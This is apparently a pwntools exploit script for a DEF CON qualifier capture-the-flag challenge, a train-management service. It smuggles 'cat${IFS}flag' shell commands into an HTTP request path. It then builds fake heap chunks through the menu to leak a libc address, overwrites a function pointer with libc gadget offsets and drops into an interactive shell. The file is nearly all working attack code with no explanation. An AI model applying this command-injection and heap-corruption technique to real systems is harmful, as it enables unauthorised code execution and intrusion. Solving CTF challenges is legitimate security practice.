#!/usr/bin/python
from pwn import *
from urllib import quote

p  = 'GET /trains?cat${IFS}flag;cat${IFS}flag;AAA;cat${IFS}flag HTTP/1.0\r\n'
p += '\r\n'

v  = 'GET /trains HTTP/1.0\r\n'
v += '\r\n'

def add_train(r, a, b, c, d, e):
   r.sendline('1')
   r.recvuntil(': ') # enter the name
   r.sendline(a)
   r.recvuntil(': ') # enter the model
   r.sendline(str(b))
   r.recvuntil(': ') # enter the type
   r.sendline(str(c))
   r.recvuntil(': ') # enter the max speed
   r.sendline(str(d))
   r.recvuntil(': ') # enter the max passengeers
   r.sendline(str(e))
   r.recvuntil(': ') # menu


def print_train(r):
   r.sendline('2')
   r.recvuntil(': ') # menu


def remove_train(r):
   print 'raised CONSTRAINT_ERROR : trains.adb:206 length check failed'
   return
   r.sendline('3')
   print r.recvuntil(': ') # menu


def update_train(r, a, b):
   r.sendline('4')
   r.recvuntil(': ') # list up trains?
   r.sendline('y')
   r.recvuntil(': ') # index
   r.sendline(str(a))
   r.recvuntil(': ') # update name?
   r.sendline('y')
   r.recvuntil(': ') # name
   r.sendline(str(b))
   r.recvuntil(': ') # menu


def index_write_train_name(r, a):
   r.sendline('7')

   r.recvuntil(': ') # index
   r.sendline(str(a))

   r.recvuntil(': ') # menu
def leak():
    r = remote('awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me', 80)
    #r = remote('localhost', 9345)
    r.send(p)

    d = r.recv(4096)

    if 'Connection refused' in d:
        r.close()
        return leak()
    print repr(d)
    if d[-2:] != ': ':
      print r.recvuntil(':')    
  
    add_train(r,'11',1,1,1,1)
    add_train(r,'11',1,1,1,1)
    add_train(r,'11',1,1,1,1)
    dat = '0\x00\x00\x00\x01\x00\x00\x00' + p64(0x0)*4
    dat += p64(0x25) + 'a' * 0x18 
    dat += p64(0x35) 
    dat += '\x00'*0x28 
    dat += p64(0x25) + 'c' * 0x18 
    dat += p64(0x35) + '\x00' * 0x28
    dat += p64(0x25) + 'd'*0x18 
    dat += p64(0x35) + 'e'*0x28 
    dat += p64(0x65) + p64(0x9FC438-0x8)
    dat += p64(0x00403320 )+'f' *0x8
    dat += p64(0x9fc5b4)
    update_train(r,1,'1234')
    update_train(r, 1, "\xde"*30)#p32(0x150)+p32(0x1)+p64(0x138)+'\x41'*(30-16))
    update_train(r, 1, "\xde"*30)#p32(0x150)+p32(0x1)+p64(0x138)+'\x41'*(30-16))
    index_write_train_name(r,dat)
    print_train(r)
    libc = u64(r.recvuntil('\x7f')[0x9a:0x9a+6]+'\x00\x00') - 0x037830#- 0x5e1550
    log.info("LIBC : 0x%x"%libc)
    bs = 0xA02d4e
    dat = '0'
    dat += '\x00'*0x27
    dat += p64(0x25) + 'c' * 0x18 
    dat += p64(0x35) + '\x00' * 0x28
    dat += p64(0x25) + 'd'*0x18 
    dat += p64(0x35) + 'e'*0x28 
    dat += p64(0x65) + p64(0x9FC438-0x8)
    dat += p64(libc+0x45390)+'f' *0x8
    dat += p64(0xa02fe4)
    index_write_train_name(r,dat)
    #print_train(r)
    #update_train(r, 1, 'ccc')
    #r.send('5\n')
    #r.interactive()
    #r.close()
    return libc,r
def pwn(r,libc):
  add_train(r,'11',1,1,1,1)
  add_train(r,'11',1,1,1,1)
  update_train(r, 5, 'bbb')
  dat = '0\x00\x00\x00\x01\x00\x00\x00' + p64(0x0)*4
  dat += p64(0x25) + 'a' * 0x18 
  dat += p64(0x35) 
  dat += '\x00'*0x28 
  dat += p64(0x25) + 'c' * 0x18 
  dat += p64(0x35) + '\x00' * 0x28
  dat += p64(0x25) + 'd'*0x18 
  dat += p64(0x35) + 'e'*0x28
  dat += p64(0x65) + p64(0x9FC738-0x8) #0x9FC600
  dat += p64(libc+0x46640)+'f' *0x8 #0x55800 #0x45390 #0x4526a #0x46640
  dat += '\x60\x21'
  index_write_train_name(r,dat)
  print_train(r)
  r.sendline('4')
  r.recvuntil(': ') # list up trains?
  r.sendline('y')
  r.recvuntil(': ') # list up trains?
  r.send('5\n') 
  r.interactive()
  #r.close()
libc,r = leak()
pwn(r,libc)
r = remote('awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me', 80)
r.send(p)
r.interactive()
